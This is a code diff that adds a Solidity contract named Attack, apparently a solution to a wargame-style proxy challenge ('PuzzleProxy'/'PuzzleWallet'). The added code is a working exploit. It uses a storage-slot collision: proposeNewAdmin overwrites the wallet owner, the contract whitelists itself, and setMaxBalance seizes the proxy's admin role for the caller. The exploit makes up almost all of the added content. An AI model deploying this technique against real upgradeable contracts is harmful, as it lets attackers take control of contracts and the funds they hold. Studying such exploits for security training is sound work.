@@ -5,6 +5,26 @@ pragma experimental ABIEncoderV2;
 import "./contracts/math/SafeMath.sol";
 import "./contracts/proxy/UpgradeableProxy.sol";
 
+contract Attack {
+    PuzzleProxy p;
+
+    constructor(PuzzleProxy _p) public {
+        p = _p;
+    }
+
+    function attack() external {
+        // set pendingAdmin (PuzzleWallet.owner) to attacker
+        p.proposeNewAdmin(address(this));
+        PuzzleWallet w = PuzzleWallet(address(p));
+        require(w.owner() == address(this), "wallet owner hijacking failed");
+        // now puzzleWallet.owner is attacker, add attacker to whitelist
+        w.addToWhitelist(address(this));
+        // now set maxBalance to hijack admin of proxy to me
+        w.setMaxBalance(uint256(uint160(tx.origin)));
+        require(p.admin() == tx.origin, "attack failed.");
+    }
+}
+
 contract PuzzleProxy is UpgradeableProxy {
     address public pendingAdmin;
     address public admin;
